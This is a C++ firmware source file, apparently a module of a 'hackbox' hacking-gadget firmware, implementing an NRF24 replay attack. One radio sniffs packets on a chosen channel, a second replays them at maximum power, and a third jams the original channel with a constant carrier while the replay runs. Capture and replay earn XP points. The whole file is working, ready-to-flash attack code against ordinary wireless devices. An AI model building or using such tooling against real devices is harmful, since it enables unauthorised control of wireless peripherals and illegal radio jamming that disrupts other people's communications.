/*
    hackbox
    hackbox custom firmware

    NRF24 Replay Attack - Record and replay NRF24 radio signals.
    Uses all three radios:
    - Radio 1: RX mode for packet capture
    - Radio 2: TX mode for packet replay
    - Radio 3: Jammer on original channel during replay

    States: CONFIGURE, CAPTURING, CAPTURED, REPLAYING
    - CONFIGURE: U/D adjusts channel +/-, R cycles data rate, CENTER starts capture
    - CAPTURING: listens for packets, CENTER=stop & review, R=replay now
    - CAPTURED: U/D scrolls packet list, CENTER or R=replay
    - REPLAYING: transmits captured packets via Radio 2, jams via Radio 3,
                 CENTER or R=replay again (when complete)

    LEFT is reserved globally as the exit-app button by runApp() in hackbox.ino,
    so no in-app action is bound to it here. CENTER is the primary OK/confirm
    button matching the rest of the firmware -- binding the "start capture"
    action to anything else is surprising to users flashing on HACKBOX or
    nRF-BOX hardware where the physical button layout differs from hackbox.

    Awards 5 XP on successful capture, 10 XP on successful replay.
*/

#include "../include/replay_attack.h"
#include "../include/level_system.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include <SPI.h>
#include <RF24.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

namespace {

// ===== Radios =====
static RF24 ra_radio1(RADIO_CE_PIN_1, RADIO_CSN_PIN_1, 16000000);
static RF24 ra_radio2(RADIO_CE_PIN_2, RADIO_CSN_PIN_2, 16000000);
static RF24 ra_radio3(RADIO_CE_PIN_3, RADIO_CSN_PIN_3, 16000000);

// ===== Data Structures =====

struct CapturedPacket {
    uint8_t data[32];
    uint8_t length;
    uint8_t channel;
    unsigned long timestamp;
};

const int MAX_PACKETS = 32;
CapturedPacket packets[MAX_PACKETS];
int packetCount = 0;

// ===== Configuration =====
uint8_t selectedChannel = 76;  // Default NRF24 channel
uint8_t addressWidth = 5;      // 3-5 bytes
int dataRateIndex = 2;         // 0=250kbps, 1=1Mbps, 2=2Mbps
const rf24_datarate_e dataRates[] = { RF24_250KBPS, RF24_1MBPS, RF24_2MBPS };
const char* dataRateNames[] = { "250K", "1M", "2M" };

// ===== State Machine =====
enum ReplayState {
    RA_CONFIGURE,
    RA_CAPTURING,
    RA_CAPTURED,
    RA_REPLAYING
};

ReplayState raState = RA_CONFIGURE;

// ===== UI State =====
bool needsRedraw = true;
unsigned long lastButtonPress = 0;
const unsigned long debounceDelay = 200;
bool isJamming = false;
int replayIndex = 0;
bool replayComplete = false;
int scrollOffset = 0;
unsigned long captureStartTime = 0;


// Promiscuous listen address
const uint8_t LISTEN_ADDR[] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

// ===== Helpers =====

void hexToStr(const uint8_t *data, int len, char *buf, int bufSize) {
    int pos = 0;
    int maxBytes = (bufSize - 1) / 3;  // "XX " per byte
    if (len < maxBytes) maxBytes = len;
    for (int i = 0; i < maxBytes; i++) {
        if (pos + 3 >= bufSize) break;
        snprintf(buf + pos, bufSize - pos, "%02X ", data[i]);
        pos += 3;
    }
    if (pos > 0 && buf[pos - 1] == ' ') {
        buf[pos - 1] = '\0';
    } else {
        buf[pos] = '\0';
    }
}

// ===== Radio Setup =====

void initCaptureRadio() {
    ra_radio1.begin();
    ra_radio1.setAutoAck(false);
    ra_radio1.stopListening();
    ra_radio1.setRetries(0, 0);
    ra_radio1.setPALevel(RF24_PA_MAX, true);
    ra_radio1.setDataRate(dataRates[dataRateIndex]);
    ra_radio1.setCRCLength(RF24_CRC_DISABLED);
    ra_radio1.setPayloadSize(32);
    ra_radio1.setAddressWidth(addressWidth);
    ra_radio1.setChannel(selectedChannel);
    ra_radio1.openReadingPipe(0, LISTEN_ADDR);
    ra_radio1.disableCRC();
    ra_radio1.startListening();
}

void initReplayRadio() {
    ra_radio2.begin();
    ra_radio2.setAutoAck(false);
    ra_radio2.stopListening();
    ra_radio2.setRetries(0, 0);
    ra_radio2.setPALevel(RF24_PA_MAX, true);
    ra_radio2.setDataRate(dataRates[dataRateIndex]);
    ra_radio2.setCRCLength(RF24_CRC_DISABLED);
    ra_radio2.setPayloadSize(32);
    ra_radio2.setAddressWidth(addressWidth);
    ra_radio2.setChannel(selectedChannel);
    ra_radio2.openWritingPipe(LISTEN_ADDR);
}

void startJammer() {
    ra_radio3.begin();
    ra_radio3.setAutoAck(false);
    ra_radio3.stopListening();
    ra_radio3.setPALevel(RF24_PA_MAX, true);
    ra_radio3.startConstCarrier(RF24_PA_MAX, selectedChannel);
    isJamming = true;
}

void stopJammer() {
    if (isJamming) {
        ra_radio3.stopConstCarrier();
        ra_radio3.powerDown();
        isJamming = false;
    }
}

// ===== Drawing =====

void drawConfigure() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "NRF24 Replay Attack");
    u8g2.drawHLine(0, 12, 128);

    u8g2.setFont(u8g2_font_5x8_tr);

    char chLine[32];
    snprintf(chLine, sizeof(chLine), "Channel:    %d", selectedChannel);
    u8g2.drawStr(0, 24, chLine);

    char drLine[32];
    snprintf(drLine, sizeof(drLine), "Data Rate:  %s", dataRateNames[dataRateIndex]);
    u8g2.drawStr(0, 34, drLine);

    char awLine[32];
    snprintf(awLine, sizeof(awLine), "Addr Width: %d bytes", addressWidth);
    u8g2.drawStr(0, 44, awLine);

    u8g2.drawStr(0, 56, "U/D=Ch  R=Rate");
    u8g2.drawStr(0, 64, "C=Start  L=Exit");

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawCapturing() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Capturing...");

    u8g2.setFont(u8g2_font_5x8_tr);

    char chLine[32];
    snprintf(chLine, sizeof(chLine), "Ch:%d Rate:%s", selectedChannel, dataRateNames[dataRateIndex]);
    u8g2.drawStr(0, 22, chLine);

    char pktLine[24];
    snprintf(pktLine, sizeof(pktLine), "Packets: %d/%d", packetCount, MAX_PACKETS);
    u8g2.drawStr(0, 32, pktLine);

    unsigned long elapsed = (millis() - captureStartTime) / 1000;
    char timeLine[24];
    snprintf(timeLine, sizeof(timeLine), "Time: %lus", elapsed);
    u8g2.drawStr(0, 42, timeLine);

    // Last packet hex preview
    if (packetCount > 0) {
        char hexStr[25];
        hexToStr(packets[packetCount - 1].data, 8, hexStr, sizeof(hexStr));
        u8g2.drawStr(0, 52, hexStr);
    }

    u8g2.drawStr(0, 62, "C=Stop  R=Play  L=Exit");

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawCaptured() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Packets Captured");
    u8g2.drawHLine(0, 12, 128);

    u8g2.setFont(u8g2_font_5x8_tr);

    char countLine[24];
    snprintf(countLine, sizeof(countLine), "Total: %d packets", packetCount);
    u8g2.drawStr(0, 22, countLine);

    // Show packet list
    int displayRows = 3;
    for (int i = 0; i < displayRows; i++) {
        int idx = scrollOffset + i;
        if (idx >= packetCount) break;

        char hexStr[22];
        hexToStr(packets[idx].data, 7, hexStr, sizeof(hexStr));

        char line[28];
        snprintf(line, sizeof(line), "#%d %s", idx + 1, hexStr);
        u8g2.drawStr(0, 32 + (i * 8), line);
    }

    u8g2.drawStr(0, 62, "U/D=Scroll C/R=Play L=Exit");

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawReplaying() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);

    if (replayComplete) {
        u8g2.drawStr(0, 10, "Replay Complete!");
    } else {
        u8g2.drawStr(0, 10, "Replaying...");
    }

    u8g2.setFont(u8g2_font_5x8_tr);

    char chLine[32];
    snprintf(chLine, sizeof(chLine), "Ch:%d Rate:%s", selectedChannel, dataRateNames[dataRateIndex]);
    u8g2.drawStr(0, 24, chLine);

    char pktLine[28];
    snprintf(pktLine, sizeof(pktLine), "Packet: %d/%d", replayIndex + 1, packetCount);
    u8g2.drawStr(0, 34, pktLine);

    if (isJamming) {
        u8g2.drawStr(0, 44, "Jammer: ACTIVE");
    }

    // Progress bar
    int barX = 4;
    int barY = 48;
    int barW = 120;
    int barH = 6;
    u8g2.drawFrame(barX, barY, barW, barH);
    int fill = (packetCount > 0) ? ((replayIndex + 1) * barW) / packetCount : 0;
    if (fill > 0) {
        u8g2.drawBox(barX, barY, fill, barH);
    }

    if (replayComplete) {
        u8g2.drawStr(0, 62, "L=Exit  C/R=Again");
    } else {
        u8g2.drawStr(0, 62, "L=Exit");
    }

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ===== Core Logic =====

void startCapture() {
    packetCount = 0;
    memset(packets, 0, sizeof(packets));
    captureStartTime = millis();

    SPI.begin();
    delay(50);

    initCaptureRadio();
    raState = RA_CAPTURING;
    needsRedraw = true;

    Serial.println("# Capture started");
    Serial.printf("# Channel: %d, Rate: %s, AddrWidth: %d\n",
                  selectedChannel, dataRateNames[dataRateIndex], addressWidth);
}

void capturePackets() {
    if (packetCount >= MAX_PACKETS) return;

    while (ra_radio1.available() && packetCount < MAX_PACKETS) {
        CapturedPacket &pkt = packets[packetCount];
        ra_radio1.read(pkt.data, 32);
        pkt.length = 32;
        pkt.channel = selectedChannel;
        pkt.timestamp = millis();
        packetCount++;

        // Serial output
        char hexStr[97];
        hexToStr(pkt.data, 32, hexStr, sizeof(hexStr));
        Serial.printf("# PKT %d: %s\n", packetCount, hexStr);

        needsRedraw = true;

        if (packetCount == 1) {
            addXP(5);  // XP for first capture
        }
    }
}

void startReplay() {
    if (packetCount == 0) return;

    replayIndex = 0;
    replayComplete = false;

    ra_radio1.stopListening();
    ra_radio1.powerDown();

    initReplayRadio();
    startJammer();

    raState = RA_REPLAYING;
    needsRedraw = true;

    Serial.println("# Replay started");
    Serial.printf("# Replaying %d packets on ch%d\n", packetCount, selectedChannel);
}

void replayNextPacket() {
    if (replayIndex >= packetCount) {
        replayComplete = true;
        stopJammer();
        addXP(10);  // XP for successful replay
        Serial.println("# Replay complete!");
        needsRedraw = true;
        return;
    }

    CapturedPacket &pkt = packets[replayIndex];
    bool ok = ra_radio2.write(pkt.data, pkt.length);

    if (ok) {
        Serial.printf("# TX %d/%d OK\n", replayIndex + 1, packetCount);
    } else {
        Serial.printf("# TX %d/%d FAIL\n", replayIndex + 1, packetCount);
    }

    replayIndex++;
    needsRedraw = true;

    delay(10);  // Inter-packet delay
}

} // namespace

// ===== Public API =====

void replayAttackSetup() {
    raState = RA_CONFIGURE;
    selectedChannel = 76;
    addressWidth = 5;
    dataRateIndex = 2;
    packetCount = 0;
    scrollOffset = 0;
    replayIndex = 0;
    replayComplete = false;
    isJamming = false;
    needsRedraw = true;
    lastButtonPress = 0;

    memset(packets, 0, sizeof(packets));

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_CENTER, INPUT_PULLUP);

    Serial.println();
    Serial.println("# hackbox NRF24 Replay Attack v1.0");

    drawConfigure();
}

void replayAttackLoop() {
    unsigned long now = millis();
    bool up = digitalRead(BUTTON_PIN_UP) == LOW;
    bool down = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool right = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool center = digitalRead(BUTTON_PIN_CENTER) == LOW;

    switch (raState) {
        case RA_CONFIGURE: {
            if (now - lastButtonPress > debounceDelay) {
                if (up) {
                    if (selectedChannel < 125) selectedChannel++;
                    needsRedraw = true;
                    lastButtonPress = now;
                } else if (down) {
                    if (selectedChannel > 0) selectedChannel--;
                    needsRedraw = true;
                    lastButtonPress = now;
                } else if (right) {
                    dataRateIndex = (dataRateIndex + 1) % 3;
                    needsRedraw = true;
                    lastButtonPress = now;
                } else if (center) {
                    // Wait for release so the capture screen doesn't see
                    // a still-held CENTER press and treat it as "stop capture".
                    while (digitalRead(BUTTON_PIN_CENTER) == LOW) delay(10);
                    startCapture();
                    lastButtonPress = millis();
                    break;
                }
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawConfigure();
            }
            break;
        }

        case RA_CAPTURING: {
            capturePackets();

            if (now - lastButtonPress > debounceDelay) {
                if (right && packetCount > 0) {
                    // Go to replay directly
                    ra_radio1.stopListening();
                    startReplay();
                    lastButtonPress = now;
                    break;
                }

                if (center) {
                    // Stop capture, show captured packets for review.
                    ra_radio1.stopListening();
                    ra_radio1.powerDown();
                    if (packetCount > 0) {
                        raState = RA_CAPTURED;
                    } else {
                        raState = RA_CONFIGURE;
                    }
                    needsRedraw = true;
                    lastButtonPress = now;
                    while (digitalRead(BUTTON_PIN_CENTER) == LOW) delay(5);
                }
            }

            // Auto-redraw periodically
            static unsigned long lastCapDraw = 0;
            if (now - lastCapDraw > 300) {
                lastCapDraw = now;
                needsRedraw = true;
            }

            if (needsRedraw) {
                needsRedraw = false;
                drawCapturing();
            }
            break;
        }

        case RA_CAPTURED: {
            if (now - lastButtonPress > debounceDelay) {
                if (up && scrollOffset > 0) {
                    scrollOffset--;
                    needsRedraw = true;
                    lastButtonPress = now;
                } else if (down && scrollOffset < packetCount - 3) {
                    scrollOffset++;
                    needsRedraw = true;
                    lastButtonPress = now;
                } else if (right || center) {
                    startReplay();
                    lastButtonPress = now;
                    break;
                }
            }
            // LEFT exits to main menu via the global runApp() exit.

            if (needsRedraw) {
                needsRedraw = false;
                drawCaptured();
            }
            break;
        }

        case RA_REPLAYING: {
            if (!replayComplete) {
                replayNextPacket();
            }

            if (now - lastButtonPress > debounceDelay) {
                if ((right || center) && replayComplete) {
                    // Replay again
                    replayIndex = 0;
                    replayComplete = false;
                    initReplayRadio();
                    startJammer();
                    needsRedraw = true;
                    lastButtonPress = now;
                }
            }
            // LEFT stops & exits via the global runApp() exit; cleanup() halts
            // the jammer and powers down the radios.

            if (needsRedraw) {
                needsRedraw = false;
                drawReplaying();
            }
            break;
        }
    }
}

void cleanupReplayAttack() {
    stopJammer();
    ra_radio1.stopListening();
    ra_radio1.powerDown();
    ra_radio2.stopListening();
    ra_radio2.powerDown();
    ra_radio3.powerDown();
    isJamming = false;
    packetCount = 0;
    Serial.println("# Replay Attack session ended");
}
